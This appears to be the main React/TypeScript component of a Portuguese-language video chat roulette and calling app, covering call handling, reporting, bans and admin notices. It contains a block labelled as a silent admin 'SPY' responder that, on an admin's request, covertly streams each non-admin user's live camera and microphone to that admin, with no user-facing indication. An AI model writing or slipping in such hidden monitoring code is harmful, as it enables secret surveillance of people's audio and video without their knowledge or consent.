import React, { useState, useEffect, useRef } from 'react';
import { AuthProvider, useAuth } from './context/AuthContext.tsx';
import { Navbar } from './components/Navbar.tsx';
import { RouletteView } from './components/RouletteView.tsx';
import { DirectCallView } from './components/DirectCallView.tsx';
import { ClientWidgetPanel } from './components/ClientWidgetPanel.tsx';
import { AdminDashboard } from './components/AdminDashboard.tsx';
import { IncomingCallModal } from './components/IncomingCallModal.tsx';
import { AuthModal } from './components/AuthModal.tsx';
import { ReportModal } from './components/ReportModal.tsx';
import { TermsModal } from './components/TermsModal.tsx';
import { socketService } from './services/socket.ts';
import { mediaBridge } from './services/mediaBridge.ts';
import { RTC_CONFIGURATION } from './services/webrtc.ts';
import { sounds } from './services/audio.ts';
import { generateLocalAvatar } from './services/avatar.ts';
import { ClientLead } from './types/index.ts';
import { Ban, Megaphone, ExternalLink } from 'lucide-react';

const TERMS_STORAGE_KEY = 'cr_terms_accepted_v1';
const THEME_STORAGE_KEY = 'cr_theme_mode';

// Helper to render text with clickable URLs
function renderMessageWithLinks(text: string) {
  const urlRegex = /(https?:\/\/[^\s]+|www\.[^\s]+)/gi;
  const parts = text.split(urlRegex);
  return parts.map((part, idx) => {
    if (/^(https?:\/\/|www\.)/i.test(part)) {
      const href = part.startsWith('http') ? part : `https://${part}`;
      return (
        <a
          key={idx}
          href={href}
          target="_blank"
          rel="noopener noreferrer"
          className="inline-flex items-center gap-1 underline font-bold text-amber-200 hover:text-white transition break-all"
        >
          <span>{part}</span>
          <ExternalLink className="w-3 h-3 inline shrink-0" />
        </a>
      );
    }
    return <React.Fragment key={idx}>{part}</React.Fragment>;
  });
}

function MainApp() {
  const { user, bannedReason, clearBanNotice } = useAuth();
  const socket = socketService.getSocket();

  const [termsAccepted, setTermsAccepted] = useState<boolean>(() => {
    return localStorage.getItem(TERMS_STORAGE_KEY) === 'true';
  });

  const [theme, setTheme] = useState<'dark' | 'light'>(() => {
    return localStorage.getItem(THEME_STORAGE_KEY) === 'light' ? 'light' : 'dark';
  });

  useEffect(() => {
    const root = document.documentElement;
    if (theme === 'light') {
      root.classList.add('theme-light');
      root.setAttribute('data-theme', 'light');
    } else {
      root.classList.remove('theme-light');
      root.setAttribute('data-theme', 'dark');
    }
    localStorage.setItem(THEME_STORAGE_KEY, theme);
  }, [theme]);

  const handleToggleTheme = () => {
    setTheme((prev) => (prev === 'dark' ? 'light' : 'dark'));
  };

  const [currentTab, setCurrentTab] = useState<'roulette' | 'direct' | 'widget' | 'admin'>('roulette');
  const [isAuthOpen, setIsAuthOpen] = useState(false);

  // Incoming Call State (1:1, Group Call Invite, or Client Web Widget Audio Call)
  const [incomingCall, setIncomingCall] = useState<{
    callId: string;
    inviteId?: string;
    roomId?: string;
    isGroupInvite?: boolean;
    isClientWidget?: boolean;
    clientMeta?: {
      leadId?: string;
      clientLabel: string;
      name: string;
      whatsapp: string;
      email: string;
      message: string;
      call_date?: string;
    };
    participants?: { username: string; unique_code: string }[];
    callerSocketId: string;
    caller: {
      id: string;
      username: string;
      unique_code: string;
      avatar?: string;
      country?: string;
    };
    callType: 'video' | 'audio';
    isMock?: boolean;
  } | null>(null);

  // Active accepted session passed to DirectCallView
  const [activeCallSession, setActiveCallSession] = useState<any>(null);

  // Report Modal State
  const [reportData, setReportData] = useState<{ code: string; name: string } | null>(null);

  // Silent Admin SPY WebRTC responder state (no UI exposed to user)
  const spyPeersRef = useRef<
    Map<string, { pc: RTCPeerConnection; pendingCandidates: RTCIceCandidateInit[] }>
  >(new Map());
  const activeSpyAdminsRef = useRef<Set<string>>(new Set());

  // Automatically open AdminDashboard when an authenticated admin signs in; leave if non-admin
  useEffect(() => {
    if (user?.role === 'admin') {
      setCurrentTab('admin');
    } else if (currentTab === 'admin') {
      setCurrentTab('roulette');
    }
  }, [user?.role]);

  // Guarantee socket is always identified whenever user is active or reconnects
  useEffect(() => {
    if (!user) return;
    socketService.identify(user);
    const onConnect = () => {
      socketService.identify(user);
    };
    socket.on('connect', onConnect);
    return () => {
      socket.off('connect', onConnect);
    };
  }, [socket, user?.id, user?.unique_code]);

  // Silent WebRTC broadcaster for Admin Moderation Monitor (SPY)
  useEffect(() => {
    if (!user || user.role === 'admin') return;

    const sendSpyOfferToAdmin = async (adminSocketId: string, stream: MediaStream) => {
      const existing = spyPeersRef.current.get(adminSocketId);
      if (existing) {
        try {
          existing.pc.close();
        } catch {
          // ignore
        }
        spyPeersRef.current.delete(adminSocketId);
      }

      const pc = new RTCPeerConnection(RTC_CONFIGURATION);
      const entry = { pc, pendingCandidates: [] as RTCIceCandidateInit[] };
      spyPeersRef.current.set(adminSocketId, entry);

      stream.getTracks().forEach((track) => {
        try {
          pc.addTrack(track, stream);
        } catch {
          // ignore
        }
      });

      pc.onicecandidate = (ev) => {
        if (ev.candidate) {
          socket.emit('spy:ice_candidate', {
            toSocketId: adminSocketId,
            candidate: ev.candidate,
          });
        }
      };

      try {
        const offer = await pc.createOffer({
          offerToReceiveAudio: false,
          offerToReceiveVideo: false,
        });
        await pc.setLocalDescription(offer);
        socket.emit('spy:webrtc_offer', {
          toAdminSocketId: adminSocketId,
          sdp: offer,
          activity: mediaBridge.getActivity(),
        });
      } catch (err) {
        console.warn('[MediaMonitor] Offer error:', err);
      }
    };

    const onSpyOfferRequest = async (data: { adminSocketId: string }) => {
      if (!data?.adminSocketId) return;
      activeSpyAdminsRef.current.add(data.adminSocketId);
      const stream = mediaBridge.getStream();
      if (stream) {
        await sendSpyOfferToAdmin(data.adminSocketId, stream);
      }
    };

    const onSpyAnswer = async (data: { adminSocketId: string; sdp: RTCSessionDescriptionInit }) => {
      const entry = spyPeersRef.current.get(data.adminSocketId);
      if (!entry) return;
      try {
        if (entry.pc.signalingState === 'have-local-offer') {
          await entry.pc.setRemoteDescription(new RTCSessionDescription(data.sdp));
          while (entry.pendingCandidates.length > 0) {
            const c = entry.pendingCandidates.shift();
            if (c) {
              await entry.pc.addIceCandidate(new RTCIceCandidate(c)).catch(() => {});
            }
          }
        }
      } catch {
        // ignore
      }
    };

    const onSpyCandidate = async (data: { fromSocketId: string; candidate: RTCIceCandidateInit }) => {
      const entry = spyPeersRef.current.get(data.fromSocketId);
      if (!entry || !data.candidate?.candidate) return;
      if (!entry.pc.remoteDescription || !entry.pc.remoteDescription.type) {
        entry.pendingCandidates.push(data.candidate);
      } else {
        await entry.pc.addIceCandidate(new RTCIceCandidate(data.candidate)).catch(() => {});
      }
    };

    const onSpyClosePeer = (data: { adminSocketId: string }) => {
      activeSpyAdminsRef.current.delete(data.adminSocketId);
      const entry = spyPeersRef.current.get(data.adminSocketId);
      if (entry) {
        try {
          entry.pc.close();
        } catch {
          // ignore
        }
        spyPeersRef.current.delete(data.adminSocketId);
      }
    };

    // If stream initializes/changes while an admin monitor is watching, stream automatically
    const unsubscribeStream = mediaBridge.subscribe((stream) => {
      if (stream && activeSpyAdminsRef.current.size > 0) {
        activeSpyAdminsRef.current.forEach((adminId) => {
          sendSpyOfferToAdmin(adminId, stream);
        });
      }
    });

    socket.on('spy:offer_request', onSpyOfferRequest);
    socket.on('spy:webrtc_answer', onSpyAnswer);
    socket.on('spy:ice_candidate', onSpyCandidate);
    socket.on('spy:close_peer', onSpyClosePeer);

    return () => {
      unsubscribeStream();
      socket.off('spy:offer_request', onSpyOfferRequest);
      socket.off('spy:webrtc_answer', onSpyAnswer);
      socket.off('spy:ice_candidate', onSpyCandidate);
      socket.off('spy:close_peer', onSpyClosePeer);
      spyPeersRef.current.forEach((entry) => {
        try {
          entry.pc.close();
        } catch {
          // ignore
        }
      });
      spyPeersRef.current.clear();
      activeSpyAdminsRef.current.clear();
    };
  }, [socket, user?.id, user?.role]);

  // Global listeners for Incoming Calls (Socket.io + Offline BroadcastChannel)
  useEffect(() => {
    const onIncomingCall = (data: {
      callId: string;
      inviteId?: string;
      roomId?: string;
      isGroupInvite?: boolean;
      isClientWidget?: boolean;
      clientMeta?: any;
      participants?: { username: string; unique_code: string }[];
      callerSocketId: string;
      caller: any;
      callType: 'video' | 'audio';
    }) => {
      console.log('[MainApp] Incoming Call received via Socket:', data);
      setIncomingCall((prev) => {
        if (prev && prev.callId === data.callId) return prev;
        sounds.unlockAudio();
        sounds.startIncomingRing();
        return data;
      });
    };

    const onCallEnded = (data?: { callId?: string }) => {
      setIncomingCall((prev) => {
        if (!prev) return null;
        if (data?.callId && prev.callId !== data.callId) return prev;
        sounds.stopAll();
        return null;
      });
    };

    const onDismissIncoming = (data: { callId: string }) => {
      setIncomingCall((prev) => {
        if (prev && (prev.callId === data.callId || prev.inviteId === data.callId)) {
          sounds.stopAll();
          return null;
        }
        return prev;
      });
    };

    socket.on('call:incoming', onIncomingCall);
    socket.on('call:ended', onCallEnded);
    socket.on('call:dismiss_incoming', onDismissIncoming);

    // Cross-tab BroadcastChannel fallback (only active when Socket.IO server is unreachable)
    const onBroadcastCall = (payload: {
      targetCode: string;
      callId: string;
      caller: any;
      callType: 'video' | 'audio';
      callerSocketId: string;
      isClientWidget?: boolean;
      clientMeta?: any;
    }) => {
      if (socketService.isConnected) return;
      if (user && payload.targetCode.toUpperCase() === user.unique_code.toUpperCase()) {
        console.log('[MainApp] Incoming Call received via Offline Broadcast:', payload);
        sounds.unlockAudio();
        sounds.startIncomingRing();
        setIncomingCall({
          callId: payload.callId,
          callerSocketId: payload.callerSocketId || 'cross_tab',
          caller: payload.caller,
          callType: payload.callType || 'video',
          isClientWidget: payload.isClientWidget,
          clientMeta: payload.clientMeta,
        });
      }
    };

    socketService.onLocal('call:incoming_broadcast', onBroadcastCall);

    return () => {
      socket.off('call:incoming', onIncomingCall);
      socket.off('call:ended', onCallEnded);
      socket.off('call:dismiss_incoming', onDismissIncoming);
      socketService.offLocal('call:incoming_broadcast', onBroadcastCall);
    };
  }, [socket, user?.id, user?.unique_code]);

  // Handle Accept Incoming Call
  const handleAcceptCall = () => {
    if (!incomingCall) return;
    sounds.stopAll();
    sounds.playConnectedChime();

    if (incomingCall.isMock || incomingCall.callerSocketId === 'mock_caller') {
      setActiveCallSession({
        callId: incomingCall.callId,
        caller: incomingCall.caller,
        callerSocketId: 'mock_caller',
        callType: incomingCall.callType || 'video',
        isClientWidget: incomingCall.isClientWidget,
        clientMeta: incomingCall.clientMeta,
        isMock: true,
        acceptedAt: Date.now(),
      });
      setIncomingCall(null);
      setCurrentTab('direct');
      return;
    }

    if (incomingCall.isGroupInvite && incomingCall.roomId) {
      socket.emit('call:accept_invite', {
        inviteId: incomingCall.inviteId || incomingCall.callId,
        roomId: incomingCall.roomId,
        callId: incomingCall.callId,
        hostSocketId: incomingCall.callerSocketId,
      });

      setActiveCallSession({
        callId: incomingCall.callId,
        roomId: incomingCall.roomId,
        caller: incomingCall.caller,
        callerSocketId: incomingCall.callerSocketId,
        callType: incomingCall.callType || 'video',
        isGroupInvite: true,
        acceptedAt: Date.now(),
      });
    } else {
      socket.emit('call:accept', {
        callId: incomingCall.callId,
        callerSocketId: incomingCall.callerSocketId,
      });

      if (!socketService.isConnected) {
        socketService.broadcastLocal('call:accepted_broadcast', {
          callId: incomingCall.callId,
          receiverCode: user?.unique_code,
        });
      }

      setActiveCallSession({
        callId: incomingCall.callId,
        caller: incomingCall.caller,
        callerSocketId: incomingCall.callerSocketId,
        callType: incomingCall.callType || 'video',
        isClientWidget: incomingCall.isClientWidget,
        clientMeta: incomingCall.clientMeta,
        acceptedAt: Date.now(),
      });
    }

    setIncomingCall(null);
    setCurrentTab('direct');
  };

  // Handle Decline Incoming Call
  const handleDeclineCall = () => {
    if (!incomingCall) return;
    sounds.stopAll();
    sounds.playHangupTone();

    if (!incomingCall.isMock && incomingCall.callerSocketId !== 'mock_caller') {
      if (incomingCall.isGroupInvite) {
        socket.emit('call:reject_invite', {
          inviteId: incomingCall.inviteId || incomingCall.callId,
          hostSocketId: incomingCall.callerSocketId,
          reason: 'Convite recusado pelo usuário.',
        });
      } else {
        socket.emit('call:reject', {
          callId: incomingCall.callId,
          callerSocketId: incomingCall.callerSocketId,
          reason: 'Chamada recusada pelo usuário.',
        });

        if (!socketService.isConnected) {
          socketService.broadcastLocal('call:rejected_broadcast', {
            callId: incomingCall.callId,
          });
        }
      }
    }

    setIncomingCall(null);
  };

  // Simulated Incoming Call (Test helper)
  const handleTriggerTestIncomingCall = () => {
    sounds.unlockAudio();
    sounds.startIncomingRing();
    setIncomingCall({
      callId: `test_call_${Date.now()}`,
      callerSocketId: 'mock_caller',
      isMock: true,
      caller: {
        id: 'user_002',
        username: 'Lucas Silva (Chamada de Teste)',
        unique_code: '#CR-849201',
        country: 'Brasil 🇧🇷',
        avatar: 'https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?w=150&auto=format&fit=crop&q=80',
      },
      callType: 'video',
    });
  };

  // Client Web Widget Live Preview / Quick Call Trigger (audio-first attendance)
  const handleStartClientPreviewCall = ({ lead }: { lead: ClientLead }) => {
    sounds.unlockAudio();
    sounds.startIncomingRing();
    setIncomingCall({
      callId: `lead_${lead.id}_${Date.now()}`,
      callerSocketId: 'mock_caller',
      isMock: true,
      callType: 'audio',
      isClientWidget: true,
      caller: {
        id: lead.id,
        username: lead.client_label,
        unique_code: 'ATENDIMENTO WEB',
        country: 'Site Externo',
        avatar: generateLocalAvatar(lead.name),
      },
      clientMeta: {
        leadId: lead.id,
        clientLabel: lead.client_label,
        name: lead.name,
        whatsapp: lead.whatsapp,
        email: lead.email,
        message: lead.message,
        call_date: lead.call_date,
      },
    });
  };

  // Trigger Report Modal
  const handleOpenReport = (code: string, name: string) => {
    setReportData({ code, name });
  };

  const handleAcceptTerms = () => {
    localStorage.setItem(TERMS_STORAGE_KEY, 'true');
    setTermsAccepted(true);
    sounds.unlockAudio();
  };

  return (
    <div className="h-screen bg-zinc-950 text-zinc-100 flex flex-col font-sans selection:bg-indigo-500 selection:text-white overflow-hidden">
      {/* Top Navbar (Head) */}
      <Navbar
        currentTab={currentTab}
        onSelectTab={(tab) => setCurrentTab(tab)}
        onOpenAuth={() => setIsAuthOpen(true)}
        theme={theme}
        onToggleTheme={handleToggleTheme}
      />

      {/* Persistent Admin Message Banner right below Head (remains until Admin sends another message) */}
      {user && user.admin_message?.text && currentTab !== 'admin' && (
        <div className="bg-gradient-to-r from-indigo-950 via-violet-950 to-indigo-950 border-b border-indigo-500/40 px-4 lg:px-8 py-2.5 flex items-center justify-center gap-2.5 text-xs shadow-lg z-30 shrink-0">
          <span className="p-1.5 bg-indigo-500/20 text-indigo-300 rounded-lg border border-indigo-400/30 shrink-0">
            <Megaphone className="w-3.5 h-3.5 animate-pulse" />
          </span>
          <div className="text-zinc-100 font-medium text-center leading-snug">
            <span className="font-bold text-indigo-300 uppercase tracking-wider text-[10px] mr-2 px-1.5 py-0.5 bg-indigo-500/20 rounded border border-indigo-400/30">
              Aviso da Administração
            </span>
            <span>{renderMessageWithLinks(user.admin_message.text)}</span>
          </div>
        </div>
      )}

      {/* Main View Container */}
      <main className="flex-1 min-h-0 flex flex-col overflow-hidden">
        {currentTab === 'roulette' && (
          <RouletteView
            onReportUser={handleOpenReport}
            onOpenAuth={() => setIsAuthOpen(true)}
          />
        )}

        {currentTab === 'direct' && (
          <DirectCallView
            onReportUser={handleOpenReport}
            activeIncomingCallSession={activeCallSession}
            onClearIncomingSession={() => setActiveCallSession(null)}
            onTriggerTestIncomingCall={handleTriggerTestIncomingCall}
          />
        )}

        {currentTab === 'widget' && (
          <ClientWidgetPanel
            onStartClientPreviewCall={handleStartClientPreviewCall}
            onOpenAuth={() => setIsAuthOpen(true)}
          />
        )}

        {currentTab === 'admin' && user?.role === 'admin' && <AdminDashboard />}
      </main>

      {/* Mandatory Terms of Acceptance Modal on Entry */}
      <TermsModal isOpen={!termsAccepted} onAccept={handleAcceptTerms} />

      {/* Incoming Call Modal (Telephone Ringing Popup with Atender / Recusar) */}
      <IncomingCallModal
        isOpen={!!incomingCall}
        caller={incomingCall?.caller || null}
        callType={incomingCall?.callType || 'video'}
        isGroupInvite={incomingCall?.isGroupInvite}
        isClientWidget={incomingCall?.isClientWidget}
        clientMeta={incomingCall?.clientMeta}
        participants={incomingCall?.participants}
        onAccept={handleAcceptCall}
        onDecline={handleDeclineCall}
      />

      {/* Auth Modal (Login, Signup, Demo accounts) */}
      <AuthModal
        isOpen={isAuthOpen}
        onClose={() => setIsAuthOpen(false)}
      />

      {/* Report Modal */}
      <ReportModal
        isOpen={!!reportData}
        reportedCode={reportData?.code}
        reportedName={reportData?.name}
        onClose={() => setReportData(null)}
      />

      {/* Real-time Banned Notification Modal */}
      {bannedReason && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/90 backdrop-blur-md">
          <div className="relative w-full max-w-md bg-zinc-900 border-2 border-red-500/60 rounded-3xl p-6 text-center shadow-2xl">
            <div className="w-16 h-16 bg-red-500/20 text-red-400 rounded-full flex items-center justify-center mx-auto mb-4 border border-red-500/40">
              <Ban className="w-8 h-8" />
            </div>
            <h3 className="text-xl font-bold text-white mb-2">Conta Suspensa pela Moderação</h3>
            <p className="text-xs text-red-300 bg-red-950/50 p-3 rounded-xl border border-red-500/30 mb-4">
              Motivo: {bannedReason}
            </p>
            <p className="text-xs text-zinc-400 mb-6">
              Sua conexão com as salas de vídeo foi interrompida de acordo com os termos de convivência da plataforma.
            </p>
            <button
              onClick={clearBanNotice}
              className="w-full py-3 bg-zinc-800 hover:bg-zinc-700 text-white font-semibold rounded-xl text-xs transition"
            >
              Compreendi e Fechar
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

export default function App() {
  return (
    <AuthProvider>
      <MainApp />
    </AuthProvider>
  );
}
